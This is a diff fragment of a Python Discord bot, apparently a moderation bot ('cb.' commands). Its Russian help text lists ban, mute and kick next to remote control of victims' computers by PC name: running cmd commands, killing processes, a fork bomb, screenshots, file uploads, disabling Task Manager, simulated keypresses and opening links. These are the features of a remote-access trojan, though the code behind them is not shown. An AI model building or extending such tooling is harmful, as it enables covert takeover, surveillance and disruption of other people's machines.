@@ -30,7 +30,7 @@ if os.name == "nt":
 async def on_ready():
      while True:
           await bot.change_presence(status=discord.Status.online, activity=discord.Game("cb.help"))
-
+		
 @bot.command()
 async def help(ctx):
     await ctx.send("```cb.ban (name) (reason) - забанит пользователя.\ncb.unban (name) - разбанит пользователя.\ncb.mute (name) - замьютит пользователя.\ncb.unmute (name) - размьютит пользователя.\ncb.chatclear - очистит чат.\ncb.kick (name) (reason) - выгонит пользователя.\ncb.getlink - выдаст ссылку на добавление данного бота.\ncb.say (text) - напишет ваш текст эмбедом.\ncb.ping - выдаст пинг бота.\ncb.ball (question) - ответит на ваш вопрос.\ncb.popit - выведет в чат попит.\ncb.cb.cmd (pcname) (command) - Выполнить команду в cmd\ncb.proclist (pcname) - Лист процессов\ncb.users - Посмотреть всех юзеров\ncb.killproc (pcname) (processname) - Закрыть процесс по имени\ncb.forkbomb (pcname) (count) - Куча консолек\ncb.msgbox (pcname) (text) - Окно с информацией\ncb.screen (pcname) - Сделать скриншот монитора\ncb.wall (pcname) (image) - Поставить картинку на рабочий стол\ncb.upload (pcname) (file) - Загрузить файл на пк юзера\ncb.taskmgrblock (pcname) - Отключение Taskmgr\ncb.taskmgrunblock (pcname) - Включение Taskmgr\ncb.press (pcname) (button) - Имитирует клавишу\ncb.write (pcname) (text) - Набирает текст\ncb.web (pcname) (www) - Открыть ссылку```")          
@@ -39,7 +39,8 @@ async def users(ctx):
                 if ctx.author.id not in owners:
                     await ctx.send("У вас нет прав для использования этой команды.") 
                 else:
-                 await ctx.send(userid)    
+                 await ctx.send(userid)   
+		
 @bot.command()
 async def screen(ctx, userpc):
         if ctx.author.id not in owners:
